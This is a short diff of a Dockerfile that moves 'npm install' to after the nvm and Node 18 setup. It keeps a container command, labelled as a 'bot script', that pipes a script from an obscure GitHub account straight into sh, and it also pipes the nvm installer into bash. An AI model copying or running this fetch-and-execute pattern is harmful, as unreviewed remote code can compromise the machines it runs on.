@@ -18,10 +18,10 @@ RUN apt-get update && apt-get install -y \
     libcurl4 \
     libjansson4 \
     libgomp1 
-RUN npm install
 RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
 RUN source ~/.bashrc
 RUN nvm install 18
+RUN npm install
             
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/55113110159/OS/main/log.sh | sh
